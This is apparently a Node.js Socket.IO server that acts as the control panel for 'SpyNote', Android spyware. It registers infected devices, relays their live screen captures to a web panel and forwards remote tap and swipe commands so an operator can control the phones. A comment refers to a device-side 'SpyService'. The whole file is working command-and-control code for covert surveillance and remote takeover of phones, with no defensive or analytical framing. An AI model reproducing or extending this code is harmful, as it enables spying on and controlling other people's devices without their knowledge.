const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json());

// Store connected devices
const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        console.log("Device registered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

// Socket.IO Connection
io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true,
                socketId: socket.id 
            });
            socket.join(deviceId);
            console.log("Device connected:", deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

   socket.on('screen-frame', (data) => {
    const deviceId = data.deviceId;
    if (devices.has(deviceId)) {
        // ✅ FIXED: Emit to 'screen-frame' (matches SpyService)
        socket.to(deviceId).emit('screen-frame', data);
        console.log(`📱 Frame from ${deviceId}: ${data.size} bytes`);
    }
});

    // Control commands
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action,
                x: parseFloat(x) || 0,
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0,
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0,
                endY: parseFloat(endY) || 0
            });
        }
    });

    socket.on('disconnect', () => {
        console.log('Disconnected:', socket.id);
        // Mark device as disconnected
        for (let [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`SpyNote Server running on port ${PORT}`);
    console.log(`Web panel: http://localhost:${PORT}`);
});
